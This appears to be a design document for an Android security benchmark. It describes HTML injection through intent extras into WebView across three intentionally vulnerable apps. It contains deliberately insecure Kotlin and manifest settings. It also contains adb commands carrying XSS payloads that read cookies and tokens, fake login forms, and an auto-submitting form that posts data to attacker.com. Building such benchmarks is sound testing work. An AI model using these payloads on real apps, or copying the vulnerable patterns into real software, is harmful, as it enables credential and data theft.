# HTML Injection Through Intent Parameter Vulnerability

## Vulnerability Overview

HTML Injection Through Intent Parameter occurs when an Android app's WebView component displays content received from intent parameters without proper sanitization. This vulnerability allows attackers to inject malicious HTML, CSS, and JavaScript code through intent extras, leading to Cross-Site Scripting (XSS) attacks within the WebView context.

The vulnerability typically manifests when apps:
- Load HTML content directly from intent extras using `loadData()` or `loadDataWithBaseURL()`
- Display user-provided content in WebView without input validation
- Enable JavaScript in WebView while processing untrusted intent data
- Fail to sanitize HTML content before rendering
- Use exported activities that accept HTML content parameters

Common attack scenarios include:
- **Cross-Site Scripting (XSS)** - Execute malicious JavaScript in the WebView context
- **Content Spoofing** - Display fake content or phishing pages
- **Data Exfiltration** - Steal sensitive data through JavaScript execution
- **Session Hijacking** - Access cookies, local storage, or session tokens
- **UI Redressing** - Modify the app's appearance or behavior

## Attack Vector Implementation Plan

Here are 3 specific attack vectors for HTML Injection Through Intent Parameter vulnerability, each implemented as a separate vulnerable Android app:

### oxo-android-ben43: Basic XSS via Script Tag Injection

**Brief Explanation**: Direct injection of `<script>` tags through intent parameters that execute JavaScript when the HTML content is loaded in WebView.

**Key Characteristics:**
- Intent parameter contains malicious script tags
- WebView executes JavaScript without validation
- Can access WebView context and perform unauthorized actions
- Immediate execution upon content load

**Vulnerable Code Pattern:**
```kotlin
val htmlContent = intent.getStringExtra("content") ?: "Default content"
webView.loadData(htmlContent, "text/html", "utf-8")  // VULNERABLE!
```

**Attack Command:**
```bash
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<h1>News Article</h1><script>alert('XSS Attack - Sensitive Data: ' + localStorage.getItem('userToken'))</script>"
```

### oxo-android-ben44: Event Handler Injection with Social Engineering

**Brief Explanation**: Injection of HTML elements with malicious event handlers that execute when users interact with the content, combined with social engineering to trick users into clicking.

**Key Characteristics:**
- Uses HTML event handlers (onclick, onmouseover, onerror)
- Requires user interaction to trigger
- Can be disguised as legitimate content
- Bypasses some XSS filters that only check for script tags

**Vulnerable Code Pattern:**
```kotlin
val title = intent.getStringExtra("title") ?: "Article"
val content = intent.getStringExtra("content") ?: "Content"
val html = "<h1>$title</h1><div>$content</div>"
webView.loadData(html, "text/html", "utf-8")  // VULNERABLE!
```

**Attack Commands:**
```bash
# Malicious button injection
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<button onclick='alert(\"Credentials stolen: \" + prompt(\"Enter password to continue:\"))'>Click to Read Full Article</button>"

# Image with error handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<img src='invalid' onerror='alert(\"Cookie: \" + document.cookie)' style='display:none'><p>Loading article...</p>"
```

### oxo-android-ben45: Form-based Data Exfiltration

**Brief Explanation**: Injection of HTML forms that automatically submit sensitive data to attacker-controlled servers, or prompt users for additional sensitive information.

**Key Characteristics:**
- Creates hidden or visible forms for data collection
- Can auto-submit forms using JavaScript
- Exfiltrates data to external servers
- Can prompt for additional user credentials

**Vulnerable Code Pattern:**
```kotlin
val articleHtml = intent.getStringExtra("article_html") ?: "<p>No content</p>"
val fullHtml = """
    <html><body>
    <h1>News Reader</h1>
    $articleHtml
    </body></html>
""".trimIndent()
webView.loadDataWithBaseURL("https://newsreader.app", fullHtml, "text/html", "utf-8", null)  // VULNERABLE!
```

**Attack Commands:**
```bash
# Auto-submitting exfiltration form
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<form id='steal' action='https://attacker.com/collect' method='POST'><input type='hidden' name='data' value='Stolen App Data'></form><script>document.getElementById('steal').submit()</script><p>Article content loading...</p>"

# Credential harvesting form
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e article_html "<div style='border:1px solid #ccc; padding:20px; background:#f9f9f9'><h3>Session Expired</h3><p>Please re-enter your credentials:</p><form><input type='text' placeholder='Username' onchange='alert(\"Stolen: \" + this.value)'><input type='password' placeholder='Password' onchange='alert(\"Password: \" + this.value)'><button type='button'>Login</button></form></div>"
```

## Implementation Details

### Vulnerable Activity Configuration
```xml
<activity
    android:name=".HtmlViewerActivity"
    android:exported="true"
    android:label="HTML Viewer">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="content" />
    </intent-filter>
</activity>
```

### WebView Security Settings (Intentionally Insecure)
```kotlin
webView.settings.javaScriptEnabled = true  // DANGEROUS
webView.settings.domStorageEnabled = true
webView.settings.allowFileAccess = false
webView.settings.allowContentAccess = true
```

## Impact Assessment

- **Confidentiality**: High - Can access sensitive app data, cookies, local storage
- **Integrity**: High - Can modify app content and user interface
- **Availability**: Medium - Can redirect users or cause app malfunction
- **OWASP Mobile Top 10**: M7 - Client Code Quality, M10 - Extraneous Functionality
- **CWE**: CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation), CWE-94 (Code Injection)

## Testing Methodology

1. **Basic XSS Testing** - Test script injection through intent parameters
2. **Event Handler Testing** - Test various HTML event handlers for code execution
3. **Form Injection Testing** - Test data exfiltration through malicious forms
4. **Content Spoofing Testing** - Test ability to display fake content
5. **Social Engineering Testing** - Test user interaction with malicious content

This benchmark provides comprehensive testing scenarios for HTML injection vulnerabilities in Android WebView implementations while demonstrating various attack techniques that security tools should detect.
